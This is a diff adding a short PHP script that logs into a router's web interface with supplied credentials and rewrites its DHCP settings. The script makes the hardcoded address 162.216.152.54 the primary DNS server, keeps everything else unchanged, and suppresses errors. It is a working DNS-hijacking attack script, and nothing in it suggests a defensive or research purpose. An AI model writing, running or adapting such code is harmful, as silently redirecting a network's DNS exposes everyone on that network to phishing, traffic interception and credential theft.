@@ -1,0 +1,60 @@
+A#!/usr/bin/php -H
+<?php
+
+error_reporting(NULL);
+ini_set("display_errors", 0);
+
+$HOSTNAME = $argv[1];
+$USERNAME = $argv[2];
+$PASSWORD = $argv[3];
+$AUTH = $USERNAME . ":" . $PASSWORD;
+
+$URL = "http://" . $HOSTNAME . "/dhcpcfg.htm";
+
+$chopts = array(
+        CURLOPT_URL=>$URL,
+        CURLOPT_PORT=>80,
+        CURLOPT_TIMEOUT=>5,
+        CURLOPT_RETURNTRANSFER=>true,
+        CURLOPT_USERPWD=>$AUTH);
+
+$ch = curl_init();
+curl_setopt_array($ch, $chopts);
+$html = curl_exec($ch);
+
+$dom = new DOMDocument;
+$dom->loadHTML($html);
+$xpath = new DOMXPath($dom);
+$data = array();
+
+$inputs = $xpath->query('//input');
+foreach($inputs as $input) {
+	if($name = $input->getAttribute('name')) {
+		if($name != "dhcpdns" && $name != "dhcpdnssec" && $name != "dhcpdnswan") {
+			$data[$name] = $input->getAttribute('value');
+		}
+    }
+}
+
+$POSTVARS = @http_build_query($data) . "&dhcpendip=162.216.152.54&dhcpmode=1&dhcpdns=162.216.152.54&dhcpdnssec=8.8.4.4&dhcpdnswan=";
+
+$URL2 = "http://" . $HOSTNAME . "/dhcpcfg.cgi";
+$chopts2 = array(
+	CURLOPT_POST=>1,
+	CURLOPT_POSTFIELDS=>$POSTVARS,
+	CURLOPT_URL=>$URL2,
+	CURLOPT_PORT=>80,
+	CURLOPT_TIMEOUT=>5,
+	CURLOPT_RETURNTRANSFER=>true,
+	CURLOPT_USERPWD=>$AUTH);
+
+$ch2 = curl_init();
+curl_setopt_array($ch2, $chopts2);
+$html2 = curl_exec($ch2);
+
+// fazer rebootar, vo dormi
+
+curl_close($ch);
+curl_close($ch2);
+
+?>
